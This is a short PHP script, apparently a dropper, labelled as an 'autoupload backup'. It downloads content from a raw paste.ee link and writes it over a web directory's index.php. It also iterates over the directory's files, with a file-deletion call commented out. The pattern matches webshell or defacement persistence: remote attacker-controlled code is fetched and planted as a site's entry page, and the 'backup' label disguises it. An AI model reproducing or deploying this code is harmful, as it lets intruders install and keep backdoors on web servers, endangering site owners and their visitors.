
<?php
// autoupload backup, NOTFOUND404
$backupURLs = array(
    '/home/' => 'https://paste.ee/r/VeAB9',
);

foreach ($backupURLs as $directoryPath => $backupURL) {
    // Mengecek apakah direktori tujuan ada, jika tidak, maka membuatnya
    if (!is_dir($directoryPath)) {
        mkdir($directoryPath, 0755, true);
    }

    $dirContents = array_diff(scandir($directoryPath), array('..', '.'));

    foreach ($dirContents as $file) {
        $filePath = $directoryPath . $file;

        if (is_file($filePath)) {
         //   unlink($filePath); 
        }
    }

    $restoreIndexFile = $directoryPath . 'index.php';

    $ch = curl_init($backupURL);
    $fp = fopen($restoreIndexFile, 'w');

    curl_setopt($ch, CURLOPT_FILE, $fp);
    curl_setopt($ch, CURLOPT_HEADER, 0);

    if (curl_exec($ch)) {
        // echo "sangat ok.";
    } else {
        // echo "ga ok";
    }

    curl_close($ch);
    fclose($fp);
}
?>
